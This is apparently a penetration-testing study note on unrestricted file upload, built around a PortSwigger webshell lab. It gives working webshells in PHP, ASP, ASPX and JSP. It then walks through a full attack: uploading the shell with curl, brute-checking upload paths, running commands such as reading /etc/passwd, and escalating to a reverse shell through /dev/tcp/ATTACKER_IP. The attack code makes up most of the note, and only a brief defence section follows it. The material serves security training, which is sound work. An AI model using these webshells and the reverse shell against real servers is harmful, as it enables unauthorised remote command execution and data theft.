---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.02 Unrestricted File Upload — Webshell Upload"
portswigger_labs: ["Remote code execution via web shell upload"]
---

# 22.02 — Unrestricted File Upload: Webshell Upload

## What Is a Webshell?

```
WEBSHELL:
  A malicious script uploaded to a web server that:
  1. Gets executed by the server-side interpreter (PHP, ASP, JSP...)
  2. Accepts commands from attacker via HTTP request
  3. Runs those commands on the server
  4. Returns the output to the attacker
  
  NET RESULT:
  Command execution on the server = full system access
  
  WHY WEBSHELL vs REVERSE SHELL:
  Webshell: attacker connects to server (port 80/443 always open)
  Reverse shell: server connects back to attacker (often firewalled)
  → Webshell works through firewalls!
```

---

## Webshell Payloads

```php
<!-- MINIMAL PHP WEBSHELL: -->
<?php system($_GET['cmd']); ?>

<!-- USAGE: -->
<!-- https://target.com/uploads/shell.php?cmd=id -->
<!-- → uid=33(www-data) gid=33(www-data) -->

<!-- MORE ROBUST: -->
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<!-- EXEC VARIANTS (if system() disabled): -->
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo `{$_GET['cmd']}`; ?>  // backtick operator
<?php proc_open($_GET['cmd'], ...); ?>

<!-- COMBINED (try all functions): -->
<?php
$cmd = $_GET['cmd'];
$output = '';
if (function_exists('system')) { ob_start(); system($cmd); $output = ob_get_clean(); }
elseif (function_exists('exec')) { exec($cmd, $out); $output = implode("\n", $out); }
elseif (function_exists('shell_exec')) { $output = shell_exec($cmd); }
elseif (function_exists('passthru')) { ob_start(); passthru($cmd); $output = ob_get_clean(); }
echo "<pre>$output</pre>";
?>
```

```aspx
<!-- ASP WEBSHELL: -->
<%@ Page Language="VB" %>
<%
Dim cmd As String = Request.QueryString("cmd")
Dim proc As System.Diagnostics.Process = New System.Diagnostics.Process()
proc.StartInfo.FileName = "cmd.exe"
proc.StartInfo.Arguments = "/c " & cmd
proc.StartInfo.RedirectStandardOutput = True
proc.StartInfo.UseShellExecute = False
proc.Start()
Response.Write(proc.StandardOutput.ReadToEnd())
%>

<!-- ASPX ONE-LINER: -->
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}.Start().StandardOutput.ReadToEnd()); %>
```

```jsp
<!-- JSP WEBSHELL: -->
<%@ page import="java.util.*,java.io.*"%>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
    out.println(disr); 
    disr = dis.readLine(); 
}
%>
```

---

## Complete Webshell Attack

```bash
# STEP 1: CREATE WEBSHELL FILE:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# STEP 2: UPLOAD VIA BURP OR CURL:
# Via Burp: intercept file upload → change filename to shell.php → forward

# Via curl (example for multipart form upload):
curl -X POST https://target.com/upload \
  -F "file=@shell.php" \
  -b "session=YOUR_SESSION"

# STEP 3: FIND WHERE THE FILE IS:
# Check response for file URL
# Check page source for img/link tags pointing to upload
# Common paths to check:
UPLOAD_PATHS=(
  "/uploads/shell.php"
  "/upload/shell.php"
  "/files/shell.php"
  "/media/shell.php"
  "/static/uploads/shell.php"
  "/img/shell.php"
  "/images/shell.php"
  "/content/uploads/shell.php"  # WordPress
  "/wp-content/uploads/shell.php"  # WordPress
  "/storage/shell.php"  # Laravel
  "/public/uploads/shell.php"
)

for PATH in "${UPLOAD_PATHS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${PATH}")
  [[ "$CODE" == "200" ]] && echo "FOUND: https://target.com${PATH}"
done

# STEP 4: EXECUTE COMMANDS:
# Check who we are:
curl "https://target.com/uploads/shell.php?cmd=id"
# → uid=33(www-data)

# Check the system:
curl "https://target.com/uploads/shell.php?cmd=uname+-a"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
curl "https://target.com/uploads/shell.php?cmd=ls+-la+/var/www/html/"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/apache2/sites-enabled/000-default.conf"

# STEP 5: ESCALATE TO REVERSE SHELL:
# On attacker machine: listen on port 4444:
nc -lvnp 4444

# Via webshell:
curl "https://target.com/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"
# URL decoded: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Testing Unrestricted Upload

```bash
# STEP 1: IDENTIFY UPLOAD ENDPOINT IN BURP
# Look for multipart/form-data POST requests

# STEP 2: TRY BASIC WEBSHELL UPLOAD
# (No bypass — test if app has ANY restrictions first)

# STEP 3: IF ACCEPTED — FIND THE FILE:
# Check response for path, check profile/page for img src

# STEP 4: IF BLOCKED — TRY BYPASSES:
# See notes 03-12 for bypass techniques!

# STEP 5: WHEN SHELL IS ACCESSIBLE — DOCUMENT IMPACT:
# Screenshot of: id, hostname, uname -a, ls /
# Show what data is accessible
# Demonstrate reading sensitive files (config, etc.)
```

---

## Popular Webshell Tools

```bash
# WEBSHELLS COLLECTION:
ls /usr/share/webshells/        # Kali Linux has them!
ls /usr/share/webshells/php/    # PHP webshells
ls /usr/share/webshells/asp/    # ASP webshells
ls /usr/share/webshells/jsp/    # JSP webshells

# p0wnyshell (full-featured PHP webshell):
# Download from SecLists or webshells repo
# Has file manager, terminal emulation

# ANTAK WEBSHELL (ASP.NET):
# Interactive PowerShell-based webshell

# LAUDANUM (collection):
# pip or Git: github.com/jbarcia/Web-Shells

# FOR TESTING: Use minimal shells to reduce size/detection
echo '<?php system($_GET["cmd"]); ?>' > minimal.php
```

---

## Fix

```
PREVENTING WEBSHELL UPLOADS:
(Detailed coverage in note 15)

QUICK REFERENCE:
1. Allowlist file extensions: ONLY .jpg, .png, .gif, .pdf (what you actually need)
2. Validate MIME type SERVER-SIDE (check actual file content)
3. Store uploads OUTSIDE web root (not accessible via URL)
4. If must serve → use a storage service (S3, GCS) or dedicated file server
5. Rename files on upload (random UUID.ext) → prevents executing by guessing name
6. Disable execution in upload directory:
   # Apache .htaccess:
   Options -ExecCGI
   AddType text/plain .php .asp .jsp
   # → PHP files served as text, not executed!
```

---

## Related Notes
- [[01 - What Makes File Upload Dangerous]] — why uploads are dangerous
- [[03 - Content-Type Bypass]] — bypassing MIME checks
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — bypassing extension checks
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
